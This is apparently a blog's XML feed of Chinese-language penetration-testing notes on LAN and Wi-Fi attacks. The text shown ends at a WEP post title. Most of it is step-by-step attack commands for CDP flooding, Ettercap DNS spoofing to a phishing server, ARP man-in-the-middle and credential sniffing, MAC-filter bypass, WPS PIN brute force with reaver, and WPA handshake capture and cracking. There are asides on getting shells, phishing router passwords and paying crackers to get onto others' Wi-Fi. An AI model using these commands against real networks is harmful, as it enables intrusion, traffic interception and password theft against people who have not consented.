+<h2 id="思科发现协议泛洪攻击"><a href="#思科发现协议泛洪攻击" class="headerlink" title="思科发现协议泛洪攻击"></a>思科发现协议泛洪攻击</h2><p>CDP：思科发现协议（CDP：Cisco Discovery Protocol）CDP 基本上是用来获取相邻设备的协议地址以及发现这些设备的平台。CDP 也可为路由器的使用提供相关接口信息。CDP 是一种独立媒体协议，运行在所有思科本身制造的设备上，包括路由器、网桥、接入服务器和交换机。需要注意的是，CDP是工作在 Layer 2 的协议，默认情况下，每60秒以 01-00-0c-cc-cc-cc 为目的地址发送一次组播通告，当达到180秒的holdtime上限后仍未获得邻居设备的通告时，将清除邻居设备信息。<br>使用Yersinia<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/8.jpg" alt="8"><br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/9.jpg" alt="9"><br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/10.jpg" alt="10">  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 内网渗透 </tag>
+            
+            <tag> CDP </tag>
+            
+            <tag> Yersinia </tag>
+            
+            <tag> macof </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[内网渗透-Ettercap实现DNS欺骗]]></title>
+        <url>https://517736522.github.io/2017/02/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Ettercap%E5%AE%9E%E7%8E%B0DNS%E6%AC%BA%E9%AA%97/</url>
+        <content type="html"><![CDATA[<p>使用Ettercap的插件dns_spoof即可实现将同一内网的用户用特定的规则将网页解析到自己的欺骗网站上。<br>首先编辑etter.dns文件<br>vim /etc/ettercap/etter.dns<br><img src="/2017/02/13/内网渗透-Ettercap实现DNS欺骗/1.jpg" alt="1"><br>* A 14.114.124.231<br>把受害者的浏览器全都解析到此IP  </p>
+<p>*.qq.com A 10.1.1.14<br>当受害者访问123.qq.com时就解析到此IP<br>10.1.1.14为自己的欺骗用服务器<br><img src="/2017/02/13/内网渗透-Ettercap实现DNS欺骗/2.jpg" alt="2"><br>ettercap -Tq -i eth0 -P dns_spoof /// ///<br>开始欺骗内网所有主机的dns解析   </p>
+<p>受害者打开qq.com<br><img src="/2017/02/13/内网渗透-Ettercap实现DNS欺骗/3.jpg" alt="3"><br>如果下载的是病毒，就可以得到shell<br>也可以制作钓鱼网站<br>也可以做路由器的钓鱼页面，获取密码  </p>
+<p>ettercap记录<br><img src="/2017/02/13/内网渗透-Ettercap实现DNS欺骗/4.jpg" alt="4">  </p>
+<p>###关闭DNS劫持时，需要刷新受害者的DNS缓存记录，才能正确解析<br>ipconfig/flushdns  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> ettercap </tag>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[内网渗透-ARP欺骗攻击-使用Arpspoof]]></title>
+        <url>https://517736522.github.io/2017/02/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-ARP%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB-%E4%BD%BF%E7%94%A8Arpspoof/</url>
+        <content type="html"><![CDATA[<p>ARP欺骗攻击：通过发送带有攻击者的mac的免费ARP报文让受害者更新自带的ARP高数缓存表，使得受害者的流量转向到攻击者。<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/1.jpg" alt="1">  </p>
+<p>首先开启ip流量转发功能<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward  </p>
+<p>然后发送arp免费报文欺骗主机<br>arpspoof -i eth0 -t target1 target2<br>arpspoof -i eth0 -t target2 target1<br>欺骗受害者：我是网关<br>欺骗路由器：我是受害者<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/2.jpg" alt="2"><br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/3.jpg" alt="3"><br>然后欺骗就成功了<br>受害者的流量都流经你那了  </p>
+<h2 id="ettercap欺骗攻击工具"><a href="#ettercap欺骗攻击工具" class="headerlink" title="ettercap欺骗攻击工具"></a>ettercap欺骗攻击工具</h2><p>ettercap -G 启用图形化界面<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/4.jpg" alt="4"><br>选择sniff-第一个选项-选择网卡<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/5.jpg" alt="5"><br>扫描主机<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/6.jpg" alt="6"><br>把.101 add to Target 1<br>吧.254 add to Target 2<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/7.jpg" alt="7">  </p>
+<p>然后选择mitm-mitm Attack:ARP poisoning–勾选第一个选项<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/8.jpg" alt="8">  </p>
+<p>start-start 开始欺骗  </p>
+<p>流量也来了  </p>
+<p>###命令行模式<br>ettercap -Tq -i eth1 -M arp:remote /33.1.1.101/ /33.1.1.254/<br>就开始欺骗了<br>ettercap -Tq -i eth1 -M arp:remote // //（老版本）<br>ettercap -Tq -i eth1 -M arp:remote /// ///(新版本）<br>进行全网段的欺骗  </p>
+<h2 id="driftnet劫持–获取流量中的图片"><a href="#driftnet劫持–获取流量中的图片" class="headerlink" title="driftnet劫持–获取流量中的图片  "></a>driftnet劫持–获取流量中的图片  </h2><p>driftnet -i eth1<br>只要流量有图片经过，会显示  </p>
+<p>telnet无加密的流量<br>dsniff -i eth1嗅探流量中POST敏感数据<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/8.jpg" alt="8">   </p>
+<p>###还有很多应用，tcpdump抓包，ferret分析登录数据，hamster登录会话<br>itindex.net/detail/52606-利用-arpspoof-tcpdump</p>
+<p>类似cookies的利用， wireshark,omnipeek,tcpdump,Dsploit,sslstrip(破解ssl加密） </p>
+<h2 id="如何发现中间人攻击了？"><a href="#如何发现中间人攻击了？" class="headerlink" title="如何发现中间人攻击了？"></a>如何发现中间人攻击了？</h2><p>在windows下tracert 33.1.1.254<br>如果有中间人攻击，第一跳会是攻击者的IP  </p>
+<h1 id="实现内网毒化，让其他用户无法上网"><a href="#实现内网毒化，让其他用户无法上网" class="headerlink" title="实现内网毒化，让其他用户无法上网"></a>实现内网毒化，让其他用户无法上网</h1><p>最简单的，不开启ip_forward<br>然后arpspoof -i eth1 -t 33.1.1.254 33.1.1.101<br>欺骗101用户：我是254</p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> arpspoof </tag>
+            
+            <tag> ettercap </tag>
+            
+            <tag> driftnet </tag>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[内网渗透-网络探测与扫描]]></title>
+        <url>https://517736522.github.io/2017/02/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%BD%91%E7%BB%9C%E6%8E%A2%E6%B5%8B%E4%B8%8E%E6%89%AB%E6%8F%8F/</url>
+        <content type="html"><![CDATA[<p>当看到网段不是192.168.0.0/24或192.168.1.0/24,那么十有八九不是家庭用路由器。  </p>
+<h2 id="1-判断网络中存活主机"><a href="#1-判断网络中存活主机" class="headerlink" title="1.判断网络中存活主机"></a>1.判断网络中存活主机</h2><p>nmap -sP 10.1.1.0/24<br><img src="/2017/02/13/内网渗透-网络探测与扫描/3.jpg" alt="3">  </p>
+<h2 id="2-判断网络结构"><a href="#2-判断网络结构" class="headerlink" title="2.判断网络结构"></a>2.判断网络结构</h2><p>traceroute qq.com<br><img src="/2017/02/13/内网渗透-网络探测与扫描/1.jpg" alt="1">  </p>
+<h2 id="3-判断网络上的设备"><a href="#3-判断网络上的设备" class="headerlink" title="3.判断网络上的设备  "></a>3.判断网络上的设备  </h2><p>nmap -sT IP<br><img src="/2017/02/13/内网渗透-网络探测与扫描/2.jpg" alt="2">  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 内网渗透 </tag>
+            
+            <tag> nmap </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[机制突破-成功获取未广播的SSID]]></title>
+        <url>https://517736522.github.io/2017/02/13/%E6%9C%BA%E5%88%B6%E7%AA%81%E7%A0%B4-%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96%E6%9C%AA%E5%B9%BF%E6%92%AD%E7%9A%84SSID/</url>
+        <content type="html"><![CDATA[<p>未广播的SSID为隐藏网络，不将SSID带入到beacon帧里。<br>airodump-ng wlan0mon<br><img src="/2017/02/13/机制突破-成功获取未广播的SSID/1.jpg" alt="1">  </p>
+<h2 id="1-静静等待"><a href="#1-静静等待" class="headerlink" title="1.静静等待"></a>1.静静等待</h2><p>等待别人连接。<br>SSID会携带到probe request frame里<br>自动在ESSID栏中显示<br><img src="/2017/02/13/机制突破-成功获取未广播的SSID/2.jpg" alt="2">  </p>
+<h2 id="2-deauth重连攻击"><a href="#2-deauth重连攻击" class="headerlink" title="2.deauth重连攻击"></a>2.deauth重连攻击</h2><p>主动让别人断开连接，重新连接。<br>aireplay-ng -a [BSSID] -c [客户端MAC] -0 2 wlan0mon<br>失败则指定信道  </p>
+<h2 id="3-暴力破解SSID"><a href="#3-暴力破解SSID" class="headerlink" title="3.暴力破解SSID"></a>3.暴力破解SSID</h2><p>bbs.ixsec.org/thread-743-1-1.html  </p>
+<h1 id="另外：连接到未开启DHCP的网络"><a href="#另外：连接到未开启DHCP的网络" class="headerlink" title="另外：连接到未开启DHCP的网络  "></a>另外：连接到未开启DHCP的网络  </h1><p>不知道网段的情况下：<br>可监听模式抓包，查看ip层地址即可  </p>
+<p>然后本机连接设置静态IP连接即可  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> deauth </tag>
+            
+            <tag> 机制突破 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[机制突破-突破Mac-address-filter]]></title>
+        <url>https://517736522.github.io/2017/02/13/%E6%9C%BA%E5%88%B6%E7%AA%81%E7%A0%B4-%E7%AA%81%E7%A0%B4Mac-address-filter/</url>
+        <content type="html"><![CDATA[<p>mac地址过滤是家庭用路由器都支持的一种无线安全策略，分为黑名单，白名单。  </p>
+<p>当我们知道了密码时，我们也是无法通过过滤机制的。<br><img src="/2017/02/13/机制突破-突破Mac-address-filter/1.jpg" alt="1"><br>可以知道客户端的mac是可以通过的<br>那么就可以更改我们的网卡mac绕过过滤。<br>macchanger wlan0 -m xx:xx:xx:xx:xx:xx<br>更改成合法客户端mac即可。  </p>
+<p>windows下也有个工具mac changer<br><img src="/2017/02/13/机制突破-突破Mac-address-filter/2.jpg" alt="2"><br><img src="/2017/02/13/机制突破-突破Mac-address-filter/3.jpg" alt="3">  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> macchanger </tag>
+            
+            <tag> 机制突破 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WPS-reaver工具穷举pin码]]></title>
+        <url>https://517736522.github.io/2017/02/13/WPS%E7%A0%B4%E8%A7%A3-reaver%E5%B7%A5%E5%85%B7%E7%A9%B7%E4%B8%BEpin%E7%A0%81/</url>
+        <content type="html"><![CDATA[<p>reaver工具，具有历史丰碑性，一般破解WPS高级工具都以这个为底层  </p>
+<p>只要路由器开启了WPS功能，都是在几小时内能够破解的<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/1.jpg" alt="1">  </p>
+<p>如何知道哪些无线Ap开了WPS呢？<br>airodump-ng wlan0mon<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/2.jpg" alt="2"><br>只要MB处54e后带点.的都是开启WPS功能  </p>
+<p>wash -i wlan0mon -C<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/3.jpg" alt="3"><br>有WPS功能都会出现  </p>
+<p>接下来运行下面的命令进行破解<br>reaver -i wlan0mon -b [BSSID] [-v -a -S -d 0 -t 1 -c 1]<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/5.jpg" alt="5">  </p>
+<p>###注意：如果出现了WARNING：Failed to associate with XX:XX:XX:XX:XX:XX (ESSID:XXX) 表示不支持wps  </p>
+<h2 id="pin码破解原理："><a href="#pin码破解原理：" class="headerlink" title="pin码破解原理："></a>pin码破解原理：</h2><p>1234 567 8<br>前4位 10^4 先跑前4位，跑准了就会固定，再跑后3位<br>后3位 10^3<br>最后1位为检验位<br>一共11000种可能，最快2s/个pin<br>最快时长为6.11小时  </p>
+<h2 id="reaver工具参数："><a href="#reaver工具参数：" class="headerlink" title="reaver工具参数："></a>reaver工具参数：</h2><p>-i 网卡名mon0<br>-b BSSID 即ap的mac<br>-c 信道<br>-e ESSID<br>-S 使用最小Diffie-Hellman keys<br>-a 自动检测目标AP最佳配置<br>-t 穷举的超时时间<br>-d 每穷举一次的闲置时间预设为1秒（信号越好RSSI SNR dBm，delay越小）<br>-n Target AP always sends a NACK [Auto] 可以防止漏码（保证每个穷举）<br>-p 加已知的4位或者8位密码<br>-w 详细信息<br>-o 输出<br>-m 指定本机的mac地址<br>-l wps lock后的等待时间 默认60<br>-x 多少次错误后的延迟 默认0<br>-g 最多pin多少次  </p>
+<h2 id="通过PIN来获取预共享秘钥"><a href="#通过PIN来获取预共享秘钥" class="headerlink" title="通过PIN来获取预共享秘钥:"></a>通过PIN来获取预共享秘钥:</h2><p>-p pin码<br>只要知道Pin码，那么即使改了密码也能知道<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/4.jpg" alt="4">  </p>
+<h2 id="进度文件-mac-wpc"><a href="#进度文件-mac-wpc" class="headerlink" title="进度文件[mac].wpc:"></a>进度文件[mac].wpc:</h2><p>有两个位置：/usr/local/etc/reaver<br>/etc/reaver<br>新一次跑的Ap都会创建进度文件。<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/6.jpg" alt="6">  </p>
+<p>第一行 前四位跑到的位置<br>第二行 后三位跑到的位置<br>第三行 0：全部不确定 1：已确定前四 2： 前四后三确定了  </p>
+<p>前四：<br>第4行开始才是穷举字典<br>后三：<br>第10004开始才是后三位的字典<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/7.jpg" alt="7">  </p>
+<h2 id="指定位置开始破解："><a href="#指定位置开始破解：" class="headerlink" title="指定位置开始破解："></a>指定位置开始破解：</h2><p>假设需要从9000开始：<br>第9005行才是9000<br>9005-4=9001<br>之后把前三改成：<br>9001<br>0<br>0  </p>
+<h1 id="pixiewps快速破解："><a href="#pixiewps快速破解：" class="headerlink" title="pixiewps快速破解："></a>pixiewps快速破解：</h1><p>pixiewps，kali下有工具<br>但是reaver1.5集成了-K </p>
+<p>reaver -i wlan0mon -c 1 -b [BSSID] -v -S -K 1<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/8.jpg" alt="8"><br>但是要使用较老的雷凌，博通，瑞日立芯片才能实现快速破解<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/9.jpg" alt="9">  </p>
+<h1 id="wifite自动化工具："><a href="#wifite自动化工具：" class="headerlink" title="wifite自动化工具："></a>wifite自动化工具：</h1><p>选择wPS目标，会先pixiwps，再穷举wps，不行就暴力破解握手包<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/10.jpg" alt="10">  </p>
+<p>作者使用了6个多小时破解处理，而且是1开头的PIN<br>如果PIN是9开头也许需要50多个小时了  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> reaver </tag>
+            
+            <tag> WPS </tag>
+            
+            <tag> pixiewps </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WPA破解-使用airolib-ng创建彩虹表加速]]></title>
+        <url>https://517736522.github.io/2017/02/13/WPA%E7%A0%B4%E8%A7%A3-%E4%BD%BF%E7%94%A8airolib-ng%E5%88%9B%E5%BB%BA%E5%BD%A9%E8%99%B9%E8%A1%A8%E5%8A%A0%E9%80%9F/</url>
+        <content type="html"><![CDATA[<p>使用airolib-ng可以提升一百倍的速度，13万左右<br>1.airolib-ng [数据库名] –import essid [写了一个或多个ssid的txt]<br><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/1.jpg" alt="1">  </p>
+<p>2.airolib-ng [数据库名] –import passwd [字典]<br><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/2.jpg" alt="2">  </p>
+<p>3.airolib-ng [数据库名] –batch  </p>
+<p><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/3.jpg" alt="3">  </p>
+<p>4.airolib-ng [数据库名] –export cowpatty [SSID] [表名]<br><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/4.jpg" alt="4">  </p>
+<p>5.跑包<br>cowpatty -s [ssid] -d [表名] -r [抓到的cap]<br><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/5.jpg" alt="5">  </p>
+<h2 id="针对跑包的几点建议："><a href="#针对跑包的几点建议：" class="headerlink" title="针对跑包的几点建议："></a>针对跑包的几点建议：</h2><p>1.如果自己很闲，自己慢慢跑EWSA pyrit<br>2.如果你有蹭网的需求，找专业跑包的15每个<br>普通包 15 12-24H 用的都是EWSA psk<br>金刚包 40-80 电费5<br>3.如果有商业化需求，使用云计算（国外有，国内应该没，很贵）  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> WPA </tag>
+            
+            <tag> airolib-ng </tag>
+            
+            <tag> 跑包建议 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WPA破解-pyrit:batch-table加速——attack_db模块加速]]></title>
+        <url>https://517736522.github.io/2017/02/13/WPA%E7%A0%B4%E8%A7%A3-pyrit-batch-table%E5%8A%A0%E9%80%9F%E2%80%94%E2%80%94attack-db%E6%A8%A1%E5%9D%97%E5%8A%A0%E9%80%9F/</url>
+        <content type="html"><![CDATA[<p><a href="http://xiao106347.blog.163.com/blog/static/215992078201311851838" target="_blank" rel="external">http://xiao106347.blog.163.com/blog/static/215992078201311851838</a><br>无线密码破解5：使用GPU加速工具PYRIT极速破解无线密码  </p>
+<p>###pyrit为kali下的工具，支持GPU加速  </p>
+<h1 id="单纯字典跑包"><a href="#单纯字典跑包" class="headerlink" title="单纯字典跑包"></a>单纯字典跑包</h1><p>pyrit -r [握手包] analyze<br>查看握手包的情况<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/5.jpg" alt="5">  </p>
+<p>pyrit -r 抓包的cap -i 字典 -b [BSSID] attack_passthrough<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/6.jpg" alt="6"> </p>
+<h1 id="hash-table跑包"><a href="#hash-table跑包" class="headerlink" title="hash-table跑包"></a>hash-table跑包</h1><p>创建hash-table<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/7.jpg" alt="7">  </p>
+<p>pyrit -r 抓到的cap -i [刚生成的.hash文件] -b [BSSID] attack_cowpatty<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/8.jpg" alt="8"><br>(cowpatty有个BUG:不认最后一行密码）  </p>
+<h1 id="batch-table跑包"><a href="#batch-table跑包" class="headerlink" title="batch-table跑包"></a>batch-table跑包</h1><p>先导入到批处理数据库<br>pyrit-i 字典 import_passwords<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/1.jpg" alt="1"><br>瞬间完成。  </p>
+<p>导入essid<br>pyrit -e [essid] create_essid<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/2.jpg" alt="2">  </p>
+<p>生成数据库<br>pyrit batch<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/3.jpg" alt="3"><br>生成速度跟aircrack-ng破解差不多  </p>
+<p>跑包<br>pyrit -e [essid] -r [抓到的cap] attack_batch<br><img src="/2017/02/13/WPA破解-pyrit-batch-table加速——attack-db模块加速/4.jpg" alt="4"><br>速度比hash-table快<br>pyrit -e [essid] -r [抓到的cap] attack_db<br>5千万每秒的速度或者更快   </p>
+<h2 id="弊端："><a href="#弊端：" class="headerlink" title="弊端："></a>弊端：</h2><p>1.和hash-table一样，需要先费时间生成<br>2.不具备传播性即不能移动复制给他人</p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> WPA </tag>
+            
+            <tag> pyrit </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WPA破解-windows下GPU跑包加速]]></title>
+        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-windows%E4%B8%8BGPU%E8%B7%91%E5%8C%85%E5%8A%A0%E9%80%9F/</url>
+        <content type="html"><![CDATA[<p>本文用到的工具为ewsa,为windows环境下的工具<br>此工具支持GPU加速  </p>
+<h2 id="破解流程："><a href="#破解流程：" class="headerlink" title="破解流程："></a>破解流程：</h2><p>1.选项–CPU选项<br>2.选项–GPU选项<br><img src="/2017/02/12/WPA破解-windows下GPU跑包加速/1.jpg" alt="1"><br>3.选项–攻击选项–新增字典（默认目录下会携带英德俄三文的字典）<br><img src="/2017/02/12/WPA破解-windows下GPU跑包加速/2.jpg" alt="2"><br>4.文件–导入tcpdump文件–选择已抓到握手包的cap文件–选择ssid<br>5.开始测试–字典枚举攻击<br><img src="/2017/02/12/WPA破解-windows下GPU跑包加速/3.jpg" alt="3"><br>（作者的跑包速度为每秒3000个）</p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> WPA </tag>
+            
+            <tag> ewsa </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WPA破解-自动化破解WPA加密]]></title>
+        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A0%B4%E8%A7%A3WPA%E5%8A%A0%E5%AF%86/</url>
+        <content type="html"><![CDATA[<h2 id="利用的是wifite自动化工具"><a href="#利用的是wifite自动化工具" class="headerlink" title="利用的是wifite自动化工具  "></a>利用的是wifite自动化工具  </h2><p>airmon-ng start wlan0进入monitor mode<br>wifite -dict 字典<br><img src="/2017/02/12/WPA破解-自动化破解WPA加密/1.jpg" alt="1"><br>一定要等到有CLIENT才能更容易的破解<br>如果路由器开了WPS则会先尝试枚举wps的PIN码(新版wifite会先调用pixiwps秒破，失败继续reaver枚举）<br><img src="/2017/02/12/WPA破解-自动化破解WPA加密/2.jpg" alt="2"> </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> wifite </tag>
+            
+            <tag> WPA </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WPA破解-Hash-table加速并用Cowpatty破解]]></title>
+        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-Hash-table%E5%8A%A0%E9%80%9F%E5%B9%B6%E7%94%A8Cowpatty%E7%A0%B4%E8%A7%A3/</url>
+        <content type="html"><![CDATA[<p>cowpatty也是一款跑包工具<br>可直接用字典，和aircrack-ng一样：<br>cowpatty -f 字典 -r [捕获的报文] -s [ssid]<br><img src="/2017/02/12/WPA破解-Hash-table加速并用Cowpatty破解/1.jpg" alt="1">   </p>
+<p>####最好的方式用hash-table破解<br>先创建hash-table<br>genpmk -f 字典 -d 生成到哪 -s ssid<br><img src="/2017/02/12/WPA破解-Hash-table加速并用Cowpatty破解/2.jpg" alt="2"><br>生成hash-table时速度为180个每秒，生成较慢  </p>
+<p>但是用hash-table跑包时，速度达4W每秒<br>cowpatty -d [hash-table] -r [捕获的报文] -s [ssid]<br><img src="/2017/02/12/WPA破解-Hash-table加速并用Cowpatty破解/3.jpg" alt="3">  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> cowpatty </tag>
+            
+            <tag> WPA </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WPA破解-hashcat跑包破解]]></title>
+        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-hashcat%E8%B7%91%E5%8C%85%E7%A0%B4%E8%A7%A3/</url>
+        <content type="html"><![CDATA[<p>hashcat工具和aircrack-ng差不多，但是hashcat能破解多种类型的密文  </p>
+<p>aircrack-ng [抓到的cap] -J xxx<br>选择需要破解的AP<br>就生成hccap格式的文件名为xxx.hccap   </p>
+<p>运行hashcat发现版本太老<br><img src="/2017/02/12/WPA破解-hashcat跑包破解/1.jpg" alt="1"><br>解决方法：<br>把时间调到2012年就能使用  </p>
+<p>hashcat能跑的类型：<br><img src="/2017/02/12/WPA破解-hashcat跑包破解/2.jpg" alt="2"><br>hashcat -m 2500 xxx.hccap /zidian.txt<br><img src="/2017/02/12/WPA破解-hashcat跑包破解/3.jpg" alt="3"><br>速度和aircrack-ng一样，没有加速，都是利用cpu</p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> WPA </tag>
+            
+            <tag> hashcat </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WPA破解-aircrack-ng破解WPA加密]]></title>
+        <url>https://517736522.github.io/2017/02/12/WPA%E7%A0%B4%E8%A7%A3-aircrack-ng%E7%A0%B4%E8%A7%A3WPA%E5%8A%A0%E5%AF%86/</url>
+        <content type="html"><![CDATA[<p>WPA基本上都是暴力破解，如果开启了WPS,应优先WPS<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/1.jpg" alt="1"><br>网卡进入监听模式并抓包<br>airodump wlan0mon<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/1.jpg" alt="1"><br>确认目标信息<br>airodump wlan0mon -w /root/1<br>这个不指定清楚，比较难抓包，要看无线网卡的功率。<br>推荐这个：airodump-ng -w /root/Desktop/wpa -c 1 wlan0mon –ignore-negative-one<br>一旦指定-w,就开始捕获握手包（在连接设备时产生）<br>所以需要进行重连攻击<br>aireplay-ng -0 5 -a APMAC -c 客户端mac wlan0mon –ignore-negative-one<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/3.jpg" alt="3"><br>客户端收到含有下线的beacon管理帧，就会下线<br>然后重连，进而获得握手包<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/4.jpg" alt="4"><br>接下来就破解<br>aircrack-ng -w /root/desktop/zidian.txt /root/desktop/wpa-01.cap<br>选择有握手包的AP  </p>
+<p><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/5.jpg" alt="5"><br>接下来就是时间和人品的问题了  </p>
+<h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><p>不指定字典情况下破解WPA/WPA2<br>crunch 10 10 iSafe12345 | aircrack-ng /root/Desktop/wpa-01.cap -e [ESSID] -w -<br><img src="/2017/02/12/WPA破解-aircrack-ng破解WPA加密/6.jpg" alt="6"> </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> aircrack-ng </tag>
+            
+            <tag> WPA </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WEP破解-破解WEP新思路--Hirte]]></title>
+        <url>https://517736522.github.io/2017/02/12/WEP%E7%A0%B4%E8%A7%A3-%E7%A0%B4%E8%A7%A3WEP%E6%96%B0%E6%80%9D%E8%B7%AF-Hirte/</url>
